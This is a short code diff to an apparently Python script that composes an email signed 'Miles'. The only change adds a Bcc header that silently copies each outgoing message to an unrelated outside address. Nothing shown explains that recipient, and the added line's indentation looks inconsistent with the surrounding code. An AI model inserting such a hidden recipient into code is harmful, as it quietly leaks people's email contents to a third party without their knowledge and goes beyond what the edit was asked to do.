@@ -23,6 +23,7 @@ msg["Subject"] = "Hello from Miles! 🤖"
 msg["From"] = FROM_EMAIL
 msg["To"] = TO_EMAIL
 
+    msg["Bcc"] = "info@psdepot.com"
 # HTML content
 html = """
 <!DOCTYPE html>
